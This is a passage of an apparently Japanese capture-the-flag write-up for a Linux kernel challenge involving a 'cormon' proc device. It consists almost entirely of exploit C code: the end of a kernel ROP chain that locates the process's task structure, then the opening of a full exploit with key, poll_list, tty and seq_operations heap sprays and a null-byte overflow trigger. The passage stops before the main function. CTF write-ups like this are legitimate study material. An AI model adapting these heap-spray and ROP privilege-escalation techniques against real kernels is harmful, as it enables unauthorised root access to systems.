&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81906510&lt;/span>); &lt;span style="color:#75715e">// pop rdi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getpid&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff810e4fc0&lt;/span>); &lt;span style="color:#75715e">// find_task_by_vpid
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff8117668f&lt;/span>); &lt;span style="color:#75715e">// pop rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6E0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff81029e7d&lt;/span>); &lt;span style="color:#75715e">// add rax, rdx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">KADDR&lt;/span>(&lt;span style="color:#ae81ff">0xffffffff817e1d6d&lt;/span>); &lt;span style="color:#75715e">// mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">*&lt;/span>rop&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#75715e">// trash
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="アウトロ">アウトロ&lt;/h2>
&lt;p>&lt;img src="./full-exp.gif" alt="uouo fish life">&lt;/p>
&lt;p>うおうおふぃっしゅらいふ。&lt;/p>
&lt;h2 id="full-exploit">Full Exploit&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-exploit.c" data-lang="exploit.c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;./exploit.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;bits/pthreadtypes.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;keyutils.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;pthread.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/mman.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*********** commands ******************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define DEV_PATH &amp;#34;/proc_rw/cormon&amp;#34; &lt;/span>&lt;span style="color:#75715e">// the path the device is placed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*********** constants ******************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS &amp;#34;exploit0&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_KEY_SPRAY (0x60)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_3RD_KEY_SPRAY (0x10 + 0x8)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_3RD_KEY_SIZE (0x290)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_PREPARE_KM32_SPRAY 2000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_POLLFD (30 + 510 + 1) &lt;/span>&lt;span style="color:#75715e">// stack, kmalloc-4k, kmalloc-32
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define TIMEOUT_POLLFD 2000 &lt;/span>&lt;span style="color:#75715e">// 2s
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_TTY_SPRAY (0x100)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define NUM_FREE_SEQOPERATIONS (0x160)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*********** globals ******************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> cormon_fd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> just_fd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">key_serial_t&lt;/span> keys[NUM_KEY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> seqops_fd[&lt;span style="color:#ae81ff">0x500&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> tty_fd[NUM_TTY_SPRAY &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>cormon_buf[&lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#ae81ff">0&lt;/span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">pthread_t&lt;/span> threads[&lt;span style="color:#ae81ff">0x1000&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> num_threads &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">pthread_mutex_t&lt;/span> mutex &lt;span style="color:#f92672">=&lt;/span> PTHREAD_MUTEX_INITIALIZER;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ulong kbase &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> neverend &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>krop_stack &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define KROP_USTACK_SIZE 0x10000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*********** utils ******************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> num_keys &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ulong _alloc_key_prefill_ulong_val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">_alloc_key_prefill_ulong&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>data &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (data &lt;span style="color:#f92672">==&lt;/span> NULL) data &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">calloc&lt;/span>(&lt;span style="color:#ae81ff">0x1000&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> ((ulong&lt;span style="color:#f92672">*&lt;/span>)data)[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> _alloc_key_prefill_ulong_val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">setxattr&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/home/user/.bashrc&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;user.x&amp;#34;&lt;/span>, data, &lt;span style="color:#ae81ff">32&lt;/span>, XATTR_CREATE);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">_alloc_key_prefill_null&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _alloc_key_prefill_ulong_val &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_alloc_key_prefill_ulong&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">alloc_key&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>payload, &lt;span style="color:#66d9ef">int&lt;/span> size, &lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>prefill)(&lt;span style="color:#66d9ef">void&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>desc &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (desc &lt;span style="color:#f92672">==&lt;/span> NULL) desc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">calloc&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0x1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sprintf&lt;/span>(desc, &lt;span style="color:#e6db74">&amp;#34;key_%d&amp;#34;&lt;/span>, num_keys);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (prefill &lt;span style="color:#f92672">!=&lt;/span> NULL) &lt;span style="color:#a6e22e">prefill&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> keys[num_keys] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">add_key&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>, desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (keys[num_keys] &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;alloc_key&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> num_keys&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spray_keys&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> num, &lt;span style="color:#66d9ef">char&lt;/span> c) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>payload &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (payload &lt;span style="color:#f92672">==&lt;/span> NULL) payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">calloc&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0x1000&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>key_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">malloc&lt;/span>(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> num; &lt;span style="color:#f92672">++&lt;/span>ix) &lt;span style="color:#a6e22e">alloc_key&lt;/span>(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">free_key&lt;/span>(&lt;span style="color:#66d9ef">key_serial_t&lt;/span> key) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">keyctl_revoke&lt;/span>(key) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_revoke&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">keyctl_unlink&lt;/span>(key, KEY_SPEC_PROCESS_KEYRING) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;keyctl_unlink&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>num_keys;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> fd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> id;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> num_size;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> timeout_ms;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">alloc_poll_list&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>_arg) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> pollfd fds[NUM_POLLFD];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>arg &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#66d9ef">alloc_poll_list_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)_arg;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fd &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> ix &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ix &lt;span style="color:#f92672">!=&lt;/span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>num_size; &lt;span style="color:#f92672">++&lt;/span>ix) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fds[ix].fd &lt;span style="color:#f92672">=&lt;/span> arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>fd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fds[ix].events &lt;span style="color:#f92672">=&lt;/span> POLLERR;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_mutex_lock&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>mutex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>num_threads;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_mutex_unlock&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>mutex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">thread_assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">poll&lt;/span>(fds, arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>num_size, arg&lt;span style="color:#f92672">-&amp;gt;&lt;/span>timeout_ms) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;poll&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_mutex_lock&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>mutex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>num_threads;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pthread_mutex_unlock&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>mutex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (neverend) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">thread_assign_to_core&lt;/span>(&lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(neverend);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">nullbyte_overflow&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">assert&lt;/span>(cormon_fd &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset&lt;/span>(cormon_buf, &lt;span style="color:#e6db74">&amp;#39;B&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">strcpy&lt;/span>((&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)cormon_buf &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;THIS_IS_CORMON_BUFFER&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>cormon_buf &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">write&lt;/span>(cormon_fd, cormon_buf, &lt;span style="color:#ae81ff">0x1000&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#a6e22e">errExit&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;nullbyte_overflow&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#75715e">// `write()` above must fail, so clear errno here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*********** main ******************/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
